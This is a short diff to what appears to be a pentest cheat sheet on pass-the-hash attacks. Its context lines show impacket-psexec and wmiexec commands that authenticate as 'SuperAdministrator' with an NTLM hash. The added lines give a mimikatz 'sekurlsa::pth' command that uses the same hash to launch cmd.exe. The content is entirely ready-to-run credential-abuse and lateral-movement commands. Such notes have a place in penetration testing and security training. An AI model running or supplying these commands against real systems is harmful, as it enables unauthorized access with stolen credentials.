@@ -119,3 +119,9 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c5
 ```
 wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@127.0.0.1
 ```
+
+or
+
+```
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:SuperAdministrator /domain:. /ntlm:13b29964cc2480b4ef454c59562e675c /run:cmd.exe" "exit"
+```
